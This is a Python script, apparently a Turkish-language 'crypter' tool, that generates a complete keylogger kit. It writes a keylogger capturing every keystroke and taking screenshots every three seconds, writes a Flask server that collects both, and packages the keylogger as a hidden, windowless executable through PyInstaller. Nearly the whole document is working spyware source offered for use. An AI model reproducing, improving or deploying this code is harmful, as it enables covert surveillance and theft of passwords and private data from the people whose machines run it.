import os
import subprocess
import signal
import sys
import time

# Renkli yazı için
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'
RED = "\033[31m"
BRED = "\033[91m"
BLUE = "\033[34m"
GREEN = "\033[32m"
BGREEN = "\033[92m"
PURPLE = "\033[35m"
BLACK = "\033[30m"
WHITE = "\033[37m"
YELLOW = "\033[33m"
BORDO = "\033[38;5;130m"
DARKGREEN = "\033[38;5;28m"
BDARKGREEN = "\033[92m"
BYELLOW = "\033[38;5;226m"
R = "\033[0m"

# Masaüstü yolunu alıyoruz
desktop_path = "/Users/fatihemre/Desktop"

# Dosyaların ve klasörün adlarını belirleyelim
keylog_txt = os.path.join(desktop_path, 'keylog.txt')
keylogger_py = os.path.join(desktop_path, 'keylogger.py')
server_py = os.path.join(desktop_path, 'server.py')
image_folder = os.path.join(desktop_path, 'image')

def check_requirements():
    """Gereksinimleri kontrol eder."""
    clear_terminal()
    requirements = {
        'OS': True,
        'Subprocess': True,
        'PyInstaller': check_pyinstaller()
    }

    all_ok = True
    print("Gereksinimler:")
    for req, available in requirements.items():
        if available:
            print(f"{GREEN}[{req}] = Var{RESET}")
        else:
            print(f"{BRED}[{req}] = Yok{RESET}")
            all_ok = False

    if not all_ok:
        print(f"{BRED}Gerekli modüller eksik. Program sonlandırılıyor...{RESET}")
        sys.exit(1)

    time.sleep(2.5)
    clear_terminal()
    
    banner = f"""
{BRED}----------------------- Zer0 - Crypt0 ------------------------
{WHITE}  ██████╗██████╗ ██╗   ██╗██████╗ ████████╗███████╗██████╗ {R}
{WHITE} ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗{R}
{WHITE} ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   █████╗  ██████╔╝{R}
{WHITE} ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██╔══╝  ██╔══██╗{R} 
{WHITE} ╚██████╗██║  ██║   ██║   ██║        ██║   ███████╗██║  ██║{R}   
{WHITE}  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝{R}   
                   {BLUE}C R Y P T E R  3 3 0 1{R}
         Instagram: @zer0crypt0      Instagram: @cyber3301rd
{BRED}----------------------- Cyber 3301 RD ------------------------
    """
    print(banner)

def check_pyinstaller():
    """PyInstaller modülünün kurulu olup olmadığını kontrol eder."""
    try:
        subprocess.run(['pyinstaller', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except FileNotFoundError:
        return False

def clear_terminal():
    """Terminali temizler."""
    os.system('cls' if os.name == 'nt' else 'clear')

def create_files_and_folder():
    """Masaüstüne gerekli dosyaları oluşturur."""
    if not os.path.exists(keylog_txt):
        with open(keylog_txt, 'w') as f:
            f.write('Keylogger logları başlatıldı.\n')
        print(f"{keylog_txt} dosyası oluşturuldu.")

    if not os.path.exists(keylogger_py):
        with open(keylogger_py, 'w') as f:
            f.write("""
from pynput.keyboard import Listener
from PIL import ImageGrab
import requests
import time

SERVER_URL = "http://127.0.0.1:5500"

def log_key(key):
    key = str(key).replace("'", "")
    try:
        response = requests.post(f"{SERVER_URL}/log", data={"key": key})
        if response.status_code == 200:
            print(f"Tuş gönderildi: {key}")
    except requests.exceptions.RequestException as e:
        print(f"Sunucuya bağlanırken hata: {e}")

def take_screenshot():
    screenshot = ImageGrab.grab()
    filename = f"screenshot_{int(time.time())}.png"
    screenshot.save(filename)
    return filename

def send_screenshot_to_server(image_path):
    try:
        with open(image_path, 'rb') as image_file:
            files = {'file': image_file}
            response = requests.post(f"{SERVER_URL}/upload", files=files)
            if response.status_code == 200:
                print(f"Ekran görüntüsü sunucuya gönderildi: {image_path}")
    except requests.exceptions.RequestException as e:
        print(f"Ekran görüntüsü gönderilirken hata: {e}")

def start_keylogger():
    with Listener(on_press=log_key) as listener:
        listener.join()

def screenshot_loop():
    while True:
        screenshot_path = take_screenshot()
        send_screenshot_to_server(screenshot_path)
        time.sleep(3)

if __name__ == "__main__":
    from threading import Thread
    keylogger_thread = Thread(target=start_keylogger)
    keylogger_thread.start()
    screenshot_thread = Thread(target=screenshot_loop)
    screenshot_thread.start()
""")
        print(f"{keylogger_py} dosyasına kod eklendi.")

    if not os.path.exists(server_py):
        with open(server_py, 'w') as f:
            f.write("""
from flask import Flask, request
import os

app = Flask(__name__)

LOG_FILE_PATH = os.path.join('/Users/fatihemre/Desktop', 'keylog.txt')
IMAGE_FOLDER = os.path.join('/Users/fatihemre/Desktop', 'image')

if not os.path.exists(IMAGE_FOLDER):
    os.makedirs(IMAGE_FOLDER)

@app.route('/log', methods=['POST'])
def handle_keypress():
    if request.form:
        key = request.form.get('key', '')
        with open(LOG_FILE_PATH, 'a') as f:
            f.write(f"{key}\\n")
        return 'OK', 200
    return 'No data', 400

@app.route('/upload', methods=['POST'])
def handle_upload():
    if 'file' in request.files:
        file = request.files['file']
        image_path = os.path.join(IMAGE_FOLDER, file.filename)
        file.save(image_path)
        return 'OK', 200
    return 'No file', 400

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5500)
""")
        print(f"{server_py} dosyasına kod eklendi.")

    if not os.path.exists(image_folder):
        os.makedirs(image_folder)
        print(f"{image_folder} klasörü oluşturuldu.")

def get_valid_path():
    """Kullanıcıdan geçerli bir keylogger.py yolu alır."""
    while True:
        user_path = input("Keylogger.py dosyasının tam yolunu girin: ").strip()
        if os.path.exists(user_path) and user_path.endswith('keylogger.py'):
            return user_path
        else:
            print(f"{BRED}Geçersiz yol! Lütfen tekrar deneyin.{RESET}")

def convert_to_exe(py_file_path):
    """PyInstaller kullanarak bir Python dosyasını exe'ye çevirir."""
    clear_terminal()
    try:
        working_dir = os.path.dirname(py_file_path)
        os.chdir(working_dir)
        
        subprocess.run([
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--clean',
            '--distpath', desktop_path,
            py_file_path
        ], check=True)
        
        print(f"{GREEN}EXE dosyası başarıyla oluşturuldu.{RESET}")
        clear_terminal()
        
        python_path = '/usr/local/bin/python3'  # Python yolu düzeltildi
        subprocess.Popen([python_path, server_py])
        print(f"{GREEN}server.py başlatıldı.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{BRED}EXE dosyası oluşturulamadı. Hata: {e}{RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{BRED}server.py çalıştırılamadı: {e}{RESET}")
        sys.exit(1)

def signal_handler(sig, frame):
    print(f"{BRED}\nÇıkılıyor...{RESET}")
    sys.exit(0)

if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    check_requirements()
    create_files_and_folder()
    user_keylogger_path = get_valid_path()
    convert_to_exe(user_keylogger_path)